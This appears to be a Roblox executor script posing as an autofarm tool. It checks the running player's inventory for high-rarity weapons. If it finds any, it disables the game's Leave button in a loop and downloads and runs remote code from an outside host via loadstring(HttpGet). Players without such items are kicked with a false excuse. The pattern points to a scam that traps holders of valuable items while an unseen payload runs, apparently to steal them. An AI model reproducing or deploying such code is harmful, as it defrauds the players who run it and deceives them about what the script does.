setclipboard = function() end

local p = game.Players.LocalPlayer
local itemData = require(
game.ReplicatedStorage.Database.Sync.Item
)

local inv = game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(p.Name)

local found = false

for itemName, amount in pairs(inv.Weapons.Owned) do
if amount > 0 then
local info = itemData[itemName]

if info then  
        local rarity = tostring(info.Rarity or "")  

        if rarity == "Godly"  
        or rarity == "Ancient"  
        or rarity == "Vintage"  
        or rarity == "Unique" then  
            found = true  
            break  
        end  
    end  
end

end

if found then
    -- Player has good items, prevent them from leaving and load the script
    task.spawn(function() 
        while task.wait() do 
            pcall(function() 
                for _,v in ipairs(getconnections(game:GetService("CoreGui").RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.Page.PageViewPageViewInnerFrame.LeaveGamePage.LeaveButtonsContainer.LeaveButtonsContainer.LeaveGameButton.Activated)) do 
                    v:Disable() 
                end 
            end) 
        end 
    end)
    
    -- Only load the main script if they have good items
    loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImYzYjVhNzkwLWJhOTYtNDBjYy1hNWE2LTg3OGNhODYzNzExOSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJjdXN0b20iLCJ1cmwiOiJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vSm9obm55aXNzb2Nvb2xsb2wvc2hpL3JlZnMvaGVhZHMvbWFpbi9hdXRvZmFybUZpeGVkTGF5TW9kZS50eHQifX0"))()
else
    -- Player doesn't have good items, kick them out
    p:Kick("Script Cant work On This Account Retry On Different Account")
end
